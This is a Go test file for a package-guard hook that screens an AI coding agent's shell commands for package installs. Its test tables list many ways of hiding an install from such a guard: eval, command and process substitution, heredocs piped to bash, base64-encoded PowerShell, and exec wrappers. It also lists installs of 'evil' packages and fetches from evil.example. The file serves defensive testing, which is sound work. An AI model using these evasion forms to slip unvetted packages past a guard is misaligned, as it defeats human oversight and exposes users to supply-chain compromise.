package claudecode_test

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"

	"github.com/Quantum-Serendipity/qsdev/internal/posture"
)

// pgDriver imports the package-guard hook template as a module and prints, as
// JSON, whether the given command is detected as an install and which package
// specifiers are extracted. It exercises only detect_install_commands, which
// returns the packages from its single parse of each segment, so it makes no
// network calls (validate_package is not run).
const pgDriver = `
import importlib.util, json, os
spec = importlib.util.spec_from_file_location('pg', os.environ['PG_PATH'])
m = importlib.util.module_from_spec(spec)
spec.loader.exec_module(m)
cmd = os.environ['PG_CMD']
dets = m.detect_install_commands(cmd)
pkgs = []
for d in dets:
    pkgs.extend(d.packages)
print(json.dumps({'detected': len(dets) > 0, 'packages': pkgs}))
`

// TestPackageGuard_ExtractsOnlyRealInstalls verifies the NF-1 fix: package names
// are extracted only from genuine install invocations, never from install-like
// words inside unrelated commands (git commit messages, grep patterns, echo).
func TestPackageGuard_ExtractsOnlyRealInstalls(t *testing.T) {
	python, err := exec.LookPath("python3")
	if err != nil {
		t.Skip("python3 not available; skipping package-guard hook test")
	}
	template, err := filepath.Abs(filepath.Join("templates", "hooks", "package-guard.py"))
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(template); err != nil {
		t.Fatalf("package-guard template not found: %v", err)
	}

	// Nested command substitutions. Each `$(` adds one recursion level.
	// Five levels stays under the cap (raised to 6) and is caught for real;
	// eight levels exceeds the cap and must fail closed (detected, no packages).
	deepNestCaught := strings.Repeat("$(", 5) + "npm install evil" + strings.Repeat(")", 5)
	deepNestFailClosed := strings.Repeat("$(", 8) + "npm install evil" + strings.Repeat(")", 8)

	cases := []struct {
		name         string
		command      string
		wantDetected bool
		wantPackages []string
	}{
		// False positives that NF-1 must NOT flag: install-like words appear
		// only inside arguments of unrelated commands.
		{"git commit message", `git commit -m "fix: refactor install logic, this is done"`, false, nil},
		{"grep for install literal", `grep -rn "npm install" .`, false, nil},
		{"grep install word", `grep install foo`, false, nil},
		{"echo mentioning pip install", `echo "run pip install requests to set up"`, false, nil},
		{"go build not go get", `go build ./...`, false, nil},

		// Genuine installs that must still be checked.
		{"npm install", `npm install left-pad`, true, []string{"left-pad"}},
		{"pip install with version", `pip install requests==2.31.0`, true, []string{"requests==2.31.0"}},
		{"sudo wrapped install", `sudo -u deploy npm install left-pad`, true, []string{"left-pad"}},
		// Regression: `-s` is a boolean for sudo (run shell). It must NOT be
		// treated as value-consuming, or `npm` would be skipped as its "value"
		// and the install would slip past argv[0]=install.
		{"sudo -s does not swallow the executable", `sudo -s npm install evil`, true, []string{"evil"}},
		{"env-prefixed install", `FOO=bar pip install requests`, true, []string{"requests"}},
		{"uv add", `uv add ruff`, true, []string{"ruff"}},
		{"cargo add", `cargo add serde`, true, []string{"serde"}},
		{"piped install still checked", `echo hi | npm install evil`, true, []string{"evil"}},
		{"compound install checks both", `pip install safe && npm install evil`, true, []string{"safe", "evil"}},
		{"bare pip from requirements", `pip install -r requirements.txt`, true, nil},

		// M3 evasions: installs the argv[0]-only detector missed before. Each
		// must now be detected while the false-positive cases above still pass.
		{"newline-separated install", "echo hi\nnpm install evil", true, []string{"evil"}},
		{"background-separated install", "sleep 1 & npm install evil", true, []string{"evil"}},
		{"python -m pip install", `python -m pip install evil-pkg`, true, []string{"evil-pkg"}},
		{"python3 -m pip install", `python3 -m pip install evil-pkg`, true, []string{"evil-pkg"}},
		{"python -m uv pip install", `python -m uv pip install ruff`, true, []string{"ruff"}},
		{"bash -c wrapped install", `bash -c "npm install evil"`, true, []string{"evil"}},
		{"sh -c wrapped install", `sh -c "pip install evil"`, true, []string{"evil"}},
		{"bash -lc combined flag", `bash -lc "npm install evil"`, true, []string{"evil"}},
		{"timeout-wrapped install", `timeout 10 npm install evil`, true, []string{"evil"}},
		// timeout's own `-s <signal>` value flag still consumes its value, and the
		// duration positional is still skipped, so the install is found.
		{"timeout signal flag then install", `timeout -s TERM 10 npm install evil`, true, []string{"evil"}},
		{"nested shell inside compound", `echo start && bash -c "cargo add serde"`, true, []string{"serde"}},

		// M3 must NOT introduce false positives: a shell -c whose script only
		// mentions an install inside an argument stays unflagged.
		{"shell -c echoing install text", `bash -c "echo pip install docs"`, false, nil},
		{"python running a script named pip", `python analyze.py --mode pip-install`, false, nil},

		// M4 fail-open bypasses: each returned [] before, so the hook ALLOWED a
		// real install. All must now be detected while the false-positive cases
		// above still pass.
		// 1. eval's string argument is a shell script — recurse into it.
		{"eval wrapped install", `eval "pip install evil"`, true, []string{"evil"}},
		{"eval unquoted install", `eval pip install evil`, true, []string{"evil"}},
		// 2. command substitution $(...) — extract and scan the inner command.
		{"command substitution install", `echo $(npm install evil)`, true, []string{"evil"}},
		// 3. backtick substitution — same as $().
		{"backtick substitution install", "x=`npm install evil`", true, []string{"evil"}},
		// 4. exec wrapper not previously in COMMAND_PREFIXES.
		{"strace wrapped install", `strace npm install evil`, true, []string{"evil"}},
		{"flock wrapped install", `flock /tmp/lock npm install evil`, true, []string{"evil"}},
		// 5. su -c runs a shell script like bash -c.
		{"su -c wrapped install", `su -c "npm install evil"`, true, []string{"evil"}},
		{"su user then -c install", `su deploy -c "pip install evil"`, true, []string{"evil"}},
		{"runuser -c wrapped install", `runuser -c "npm install evil"`, true, []string{"evil"}},
		{"runuser exec form install", `runuser -u deploy npm install evil`, true, []string{"evil"}},
		// 6. xargs runs its trailing command.
		{"xargs trailing install", `xargs npm install evil`, true, []string{"evil"}},
		{"piped xargs bare install", `echo evil | xargs npm install`, true, nil},
		// 7. process substitution <(...) / >(...).
		{"process substitution install", `diff <(pip install evil) x`, true, []string{"evil"}},
		// 8. deep nesting under the raised cap is still caught for real.
		{"five-deep nesting caught", deepNestCaught, true, []string{"evil"}},

		// Catalog-driven wrapper fallback: exec-style wrappers NOT in
		// COMMAND_PREFIXES used to hide the install behind an unknown argv[0]
		// and fail open. The fallback scans argv for a catalog manager token
		// immediately followed by its install verb and re-classifies from that
		// token, so the real package specifiers are still extracted.
		{"setpriv wrapped install", `setpriv --reuid 1000 npm install evil`, true, []string{"evil"}},
		{"nsenter wrapped install", `nsenter -t 1 npm install evil`, true, []string{"evil"}},
		{"systemd-run wrapped install", `systemd-run npm install evil`, true, []string{"evil"}},
		// The fallback must NOT fire on an install VERB alone: `install` is not
		// a catalog manager token, so an unknown argv[0] stays unflagged.
		{"unknown command bare install verb", `frobnicate install foo`, false, nil},

		// Fail-closed cases: exceeding the recursion cap, or an unparseable
		// segment, must be DETECTED (surfaced for validation) — never dropped.
		{"eight-deep nesting fails closed", deepNestFailClosed, true, nil},
		{"unbalanced quotes fail closed", `npm install "evil`, true, nil},

		// Quote-aware segmentation: operators and newlines inside quotes (or
		// escaped, or inside a heredoc body) are argument text, not command
		// separators, so ordinary commands must not fail closed.
		{"quoted grep alternation", `grep -n "foo\|bar" README.md`, false, nil},
		{"quoted jq pipe", `jq '.a | .b' f.json`, false, nil},
		{"quoted semicolon in commit message", `git commit -m 'fix: a; b'`, false, nil},
		{"quoted ampersand", `echo "a && b & c"`, false, nil},
		{"multi-line commit message", "git commit -m \"fix: thing\n\nbody; it's done\"", false, nil},
		{"heredoc commit message", "git commit -m \"$(cat <<'EOF'\nfix(x): don't; break | it\n\nnpm install evil\nEOF\n)\"", false, nil},
		{"heredoc to file with tab strip", "cat <<-EOF > f\n\tdon't\n\tEOF\necho ok", false, nil},
		{"quoted install text with operator", `echo "a && npm install evil"`, false, nil},
		{"stderr redirect is not a separator", `go test ./... 2>&1 | tail -5`, false, nil},
		// Real separators outside quotes must still split.
		{"redirect then chained install", `ls &>/dev/null; pip install evil`, true, []string{"evil"}},
		{"subshell install", `(cd x && npm install evil)`, true, []string{"evil"}},
		{"line continuation install", "npm \\\ninstall evil", true, []string{"evil"}},
		{"heredoc piped to shell", "cat <<EOF | bash\nnpm install evil\nEOF", true, []string{"evil"}},
		{"heredoc read by shell", "bash <<EOF\nnpm install evil\nEOF", true, []string{"evil"}},
		{"heredoc sourced from stdin", "cat <<EOF | source /dev/stdin\nnpm install evil\nEOF", true, []string{"evil"}},
		{"heredoc read by eval", "eval \"$(cat)\" <<EOF\nnpm install evil\nEOF", true, []string{"evil"}},
		{"heredoc in substitution run by shell -c", "bash -c \"$(cat <<EOF\nnpm install evil\nEOF\n)\"", true, []string{"evil"}},
		{"heredoc in process substitution sourced", "source <(cat <<EOF\nnpm install evil\nEOF\n)", true, []string{"evil"}},
		// `<<` that the shell does NOT treat as a heredoc must not hide the
		// following lines from the scan.
		{"heredoc marker inside comment", "echo hi # <<EOF\nnpm install evil\nEOF", true, []string{"evil"}},
		{"shift in arithmetic command", "((x=1<<2))\nnpm install evil", true, []string{"evil"}},
		{"shift in legacy arithmetic", "echo $[1<<2]\nnpm install evil", true, []string{"evil"}},
		{"<< inside parameter expansion", "echo ${y//<</z}\nnpm install evil", true, []string{"evil"}},
		{"escaped blank before hash is not a comment", `echo a\ #b; npm install evil`, true, []string{"evil"}},
		{"comment with apostrophe", "ls # it's fine\necho ok", false, nil},

		// Control: the mandated false-positive suite must remain unflagged even
		// after the recursive-descent hardening above.
		{"control: git commit message", `git commit -m "fix: refactor install logic"`, false, nil},
		{"control: grep npm install literal", `grep -rn "npm install" .`, false, nil},
		{"control: grep install word", `grep install foo`, false, nil},
		{"control: echo pip install text", `echo "run pip install requests"`, false, nil},
		{"control: go build", `go build ./...`, false, nil},
		{"control: bash -c echo install text", `bash -c "echo pip install docs"`, false, nil},
		{"control: python script named pip-install", `python analyze.py --mode pip-install`, false, nil},

		// W165: the stale dogfooded hook regex-matched the imperative-Nix phrase
		// anywhere in the raw command, denying searches and notes about it.
		{"grep for imperative nix phrase", `grep -rn "nix profile install" --include='*.go' .`, false, nil},
		{"rg for imperative nix phrase", `rg -n "nix profile install" .`, false, nil},
		{"git log grep imperative nix phrase", `git log --grep='nix profile install'`, false, nil},
		{"commit message mentioning imperative nix", `git commit -m 'docs: forbid nix profile install'`, false, nil},
		{"commit message listing package words", `git commit -m 'docs: explain npm install flow for fs is git'`, false, nil},
		{"grep for pip install literal", `grep -rn 'pip install' docs/`, false, nil},
		{"real imperative nix install still detected", `nix profile install nixpkgs#hello`, true, nil}, // manager-level deny downstream; no package lookups
		// `nix profile add` is the current verb (`install` is its alias), global
		// options may precede the subcommand, and unknown wrappers must not
		// hide it.
		{"nix profile add detected", `nix profile add nixpkgs#hello`, true, nil},
		{"nix global option before profile add", `nix --extra-experimental-features 'nix-command flakes' profile add nixpkgs#hello`, true, nil},
		{"wrapped nix profile add", `setpriv --reuid 1000 nix profile add nixpkgs#hello`, true, nil},
		{"wrapped nix-env install", `nsenter -t 1 nix-env -iA nixpkgs.hello`, true, nil},
		{"control: nix profile list", `nix profile list`, false, nil},
		{"control: nix build", `nix build .#qsdev`, false, nil},
		{"control: grep for nix profile add", `grep -rn "nix profile add" docs/`, false, nil},
		// Interpreters and PowerShell hosts that run a following install.
		{"pwsh -c wrapping npm install", `pwsh -c "npm install evil"`, true, []string{"evil"}},
		{"pwsh -EncodedCommand wrapping npm install", "pwsh -EncodedCommand " + utf16LEBase64("npm install evil"), true, []string{"evil"}},
		{"pwsh unquoted -Command npm install", `pwsh -NoProfile -Command npm install evil`, true, []string{"evil"}},
		{"perl exec of trailing argv", `perl -e 'exec @ARGV' npm install evil`, true, []string{"evil"}},
		{"control: pwsh -c echo install text", `pwsh -c "Write-Host 'npm install docs'"`, false, nil},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			cmd := exec.Command(python, "-c", pgDriver)
			// PYTHONDONTWRITEBYTECODE keeps the import from writing a
			// __pycache__ directory into the embedded templates tree.
			cmd.Env = append(os.Environ(), "PYTHONDONTWRITEBYTECODE=1", "PG_PATH="+template, "PG_CMD="+tc.command)
			out, err := cmd.CombinedOutput()
			if err != nil {
				t.Fatalf("driver failed: %v\n%s", err, out)
			}
			var res struct {
				Detected bool     `json:"detected"`
				Packages []string `json:"packages"`
			}
			if err := json.Unmarshal(out, &res); err != nil {
				t.Fatalf("bad driver output %q: %v", out, err)
			}
			if res.Detected != tc.wantDetected {
				t.Errorf("detected = %v, want %v (command: %s)", res.Detected, tc.wantDetected, tc.command)
			}
			if !slices.Equal(res.Packages, tc.wantPackages) {
				t.Errorf("packages = %v, want %v (command: %s)", res.Packages, tc.wantPackages, tc.command)
			}
		})
	}
}

// TestPackageGuard_AgeCheckedEcosystemsMatchPosture keeps the posture report's
// age-gating coverage (posture.GuardAgeCheckedLanguages) in sync with the
// registries the hook template actually age-checks, so posture never reports
// an ecosystem as age-gated that the guard lets through unchecked.
func TestPackageGuard_AgeCheckedEcosystemsMatchPosture(t *testing.T) {
	data, err := os.ReadFile(filepath.Join("templates", "hooks", "package-guard.py"))
	if err != nil {
		t.Fatal(err)
	}
	src := string(data)
	block := regexp.MustCompile(`(?s)\n_RESOLVERS = \{(.*?)\n\}`).FindStringSubmatch(src)
	if block == nil {
		t.Fatal("_RESOLVERS table not found in package-guard.py")
	}
	// OSV ecosystem name -> qsdev language name.
	languageOf := map[string]string{
		"npm": "javascript", "PyPI": "python", "crates.io": "rust", "Go": "go",
		"RubyGems": "ruby", "Packagist": "php", "Pub": "dart", "NuGet": "dotnet",
	}
	var checked []string
	for _, m := range regexp.MustCompile(`"([^"]+)":\s*(_resolve_\w+)`).FindAllStringSubmatch(block[1], -1) {
		// A resolver age-checks when it reports a publication age.
		body := regexp.MustCompile(`(?s)\ndef ` + m[2] + `\(.*?\n\S`).FindString(src)
		if body == "" {
			t.Fatalf("resolver %s not found in package-guard.py", m[2])
		}
		if !strings.Contains(body, "_age_days(") {
			continue
		}
		lang, ok := languageOf[m[1]]
		if !ok {
			t.Fatalf("package-guard.py age-checks %q; map it to its language here and add it to posture.GuardAgeCheckedLanguages", m[1])
		}
		checked = append(checked, lang)
	}
	slices.Sort(checked)
	want := slices.Sorted(slices.Values(posture.GuardAgeCheckedLanguages))
	if !slices.Equal(checked, want) {
		t.Errorf("package-guard.py age-checks %v, posture.GuardAgeCheckedLanguages = %v", checked, want)
	}
}

// TestPackageGuard_DeniesUnvalidatedInstallers runs the hook end to end on
// installs through managers it cannot validate against a registry (Perl,
// Elixir archives, Zig, Dart, Lua, R, PowerShell) and on `nix profile add`,
// the current name of `nix profile install`. Each is denied before any network
// lookup. Lockfile-honouring restores stay allowed.
func TestPackageGuard_DeniesUnvalidatedInstallers(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		command string
		want    string
	}{
		{"nix profile add", "nix profile add github:attacker/flake#tool", "deny"},
		{"nix profile install alias", "nix profile install nixpkgs#hello", "deny"},
		{"cpan positional module", "cpan Evil::Backdoor", "deny"},
		{"cpanm", "cpanm Evil::Backdoor", "deny"},
		{"cpm install", "cpm install Evil", "deny"},
		{"perl -MCPAN", "perl -MCPAN -e 'install Evil'", "deny"},
		{"carton update", "carton update", "deny"},
		{"mix archive.install", "mix archive.install github attacker/persist", "deny"},
		{"mix escript.install", "mix escript.install hex evil", "deny"},
		{"mix deps.update", "mix deps.update --all", "deny"},
		{"zig fetch --save", "zig fetch --save https://evil.example/x.tar.gz", "deny"},
		{"dart pub global activate", "dart pub global activate --source git https://evil.example/x", "deny"},
		{"flutter pub upgrade", "flutter pub upgrade", "deny"},
		{"lx add", "lx add evil", "deny"},
		{"luarocks flag before build", "luarocks --local build evil", "deny"},
		{"Rscript install.packages", `Rscript -e "install.packages('evil')"`, "deny"},
		{"R remotes install_github", `R -q -e 'remotes::install_github("attacker/pkg")'`, "deny"},
		{"pwsh -c Install-PSResource", "pwsh -c Install-PSResource Evil", "deny"},
		{"powershell lowercase install-module", `powershell -NoProfile -Command "install-module Evil -Force"`, "deny"},
		{"bash -c wrapped cpan", `bash -c "cpan Evil"`, "deny"},
		{"bare cpan shell reads stdin", `echo "install Evil" | cpan`, "deny"},
		{"cpanm installdeps", "cpanm --installdeps .", "deny"},
		{"carton install re-resolves", "carton install", "deny"},
		{"perl -M CPAN spaced", "perl -M CPAN -e 'install Evil'", "deny"},
		{"perl use CPAN in switch cluster", "perl -wle 'use CPAN; CPAN::Shell->install(q(Evil))'", "deny"},
		{"perl App::cpanminus", "perl -MApp::cpanminus::script -e 'App::cpanminus::script->new->doit'", "deny"},
		{"mix igniter.install", "mix igniter.install ash", "deny"},
		{"dart pub downgrade", "dart pub downgrade", "deny"},
		{"wrapped flutter pub add", "fvm flutter pub add http", "deny"},
		{"versioned luarocks", "luarocks-5.4 install evil", "deny"},
		{"R pak", `Rscript -e 'pak::pak("attacker/pkg")'`, "deny"},
		{"R update.packages", `R -e 'update.packages(ask = FALSE)'`, "deny"},
		{"pwsh -EncodedCommand Install-Module", "pwsh -enc " + utf16LEBase64("Install-Module Evil -Force"), "deny"},
		{"pwsh undecodable -EncodedCommand", "pwsh -EncodedCommand !!notbase64", "deny"},
		{"pwsh Update-Module", `pwsh -Command "Update-Module Pester"`, "deny"},
		{"pwsh PSResourceGet alias", `pwsh -c "isres Evil"`, "deny"},
		{"nix global options before profile add", "nix --extra-experimental-features 'nix-command flakes' profile add nixpkgs#hello", "deny"},

		{"mix deps.get restores the lockfile", "mix deps.get --check-locked", "allow"},
		{"carton install --deployment", "carton install --deployment", "allow"},
		{"dart pub get", "dart pub get --enforce-lockfile", "allow"},
		{"zig build", "zig build test", "allow"},
		{"Rscript renv restore", `Rscript -e "renv::restore()"`, "allow"},
		{"perl script", "perl -Ilib t/basic.t", "allow"},
		{"pwsh analyzer", `pwsh -Command "Invoke-ScriptAnalyzer -Path ."`, "allow"},
		{"nix profile list", "nix profile list", "allow"},
		{"command -v cpan lookup", "command -v cpan", "allow"},
		{"which cpanm lookup", "which cpanm", "allow"},
		{"carton exec", "carton exec -- prove -l t", "allow"},
		{"perl CPAN::Meta is not the installer", "perl -MCPAN::Meta -e 'print CPAN::Meta->load_file(q(META.json))->version'", "allow"},
		{"mix deps.get", "mix deps.get", "allow"},
		{"luarocks list", "luarocks list", "allow"},
		{"R CMD check", "R CMD check .", "allow"},
		{"pwsh -File", "pwsh -File build.ps1", "allow"},
		{"pwsh Get-Module", `pwsh -c "Get-Module -ListAvailable"`, "allow"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			dir := t.TempDir()
			got := runHookScript(t, "package-guard.py",
				map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": tc.command}},
				"CLAUDE_PROJECT_DIR="+dir, "CLAUDE_AUDIT_DIR="+dir)
			if got != tc.want {
				t.Errorf("decision = %q, want %q (command: %s)", got, tc.want, tc.command)
			}
		})
	}
}

// utf16LEBase64 encodes a PowerShell script the way -EncodedCommand expects.
func utf16LEBase64(script string) string {
	b := make([]byte, 0, 2*len(script))
	for _, r := range script {
		b = append(b, byte(r), byte(r>>8))
	}
	return base64.StdEncoding.EncodeToString(b)
}
